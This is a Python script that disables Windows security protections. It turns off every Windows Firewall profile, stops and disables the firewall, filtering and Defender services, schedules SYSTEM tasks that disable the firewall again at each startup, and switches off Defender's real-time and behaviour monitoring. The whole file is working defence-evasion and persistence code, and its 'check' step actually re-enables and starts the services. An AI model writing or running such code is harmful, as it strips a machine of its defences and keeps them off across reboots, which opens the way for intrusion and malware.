import subprocess
import time

def run_command(command, shell=False):
    """Run system commands with error handling and status reports."""
    try:
        result = subprocess.run(command, check=True, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return (True, result.stdout.decode('utf-8').strip())
    except subprocess.CalledProcessError as error:
        return (False, error.stderr.decode('utf-8').strip())

def disable_windows_firewall():
    print("Attempting to disable Windows Firewall...")
    firewall_commands = [
        "netsh advfirewall set allprofiles state off",
        "netsh advfirewall set publicprofile state off",
        "netsh advfirewall set privateprofile state off",
        "netsh advfirewall set domainprofile state off"
    ]
    for command in firewall_commands:
        success, message = run_command(command)
        print(f"Command: {command}\nResult: {'Success' if success else 'Failed'}\nMessage: {message}\n")

def manage_services(action):
    """Manage and manipulate Windows service configurations."""
    services = ["MpsSvc", "BFE", "SharedAccess", "WinDefend"]
    for service in services:
        print(f"{action.capitalize()} service: {service}")
        if action == "disable":
            sc_config_cmd = f"sc config {service} start= disabled"
            sc_stop_cmd = f"sc stop {service}"
        else:
            sc_config_cmd = f"sc config {service} start= auto"
            sc_stop_cmd = f"sc start {service}"

        success_config, message_config = run_command(sc_config_cmd)
        print(f"Configuration change: {'Success' if success_config else 'Failed'}\nMessage: {message_config}\n")
        
        success_stop, message_stop = run_command(sc_stop_cmd)
        print(f"Service {action}: {'Success' if success_stop else 'Failed'}\nMessage: {message_stop}\n")

def schedule_firewall_tasks():
    """Schedule tasks to disable firewall and services on startup."""
    tasks = {
        "DisableFirewall": "netsh advfirewall set allprofiles state off",
        "DisableServices": "sc stop MpsSvc && sc stop BFE && sc stop SharedAccess"
    }
    for task_name, task_action in tasks.items():
        print(f"Scheduling task: {task_name}")
        schtask_create_cmd = f"schtasks /create /f /tn {task_name} /tr \"{task_action}\" /sc onstart /ru SYSTEM"
        success, message = run_command(schtask_create_cmd)
        print(f"Task creation: {'Success' if success else 'Failed'}\nMessage: {message}\n")

def disable_windows_defender():
    print("Attempting to disable Windows Defender...")
    powershell_commands = [
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true",
        # Add other Defender settings as needed
    ]
    for cmd in powershell_commands:
        full_command = f"powershell -Command \"{cmd}\""
        success, message = run_command(full_command, shell=True)
        print(f"Command: {cmd}\nResult: {'Success' if success else 'Failed'}\nMessage: {message}\n")

def main():
    disable_windows_firewall()
    manage_services("disable")
    schedule_firewall_tasks()
    disable_windows_defender()
    print("Waiting for operations to complete...")
    time.sleep(5)  # Provide some buffer time for services to acknowledge the changes
    manage_services("check")  # Check status of services after operations

if __name__ == "__main__":
    main()
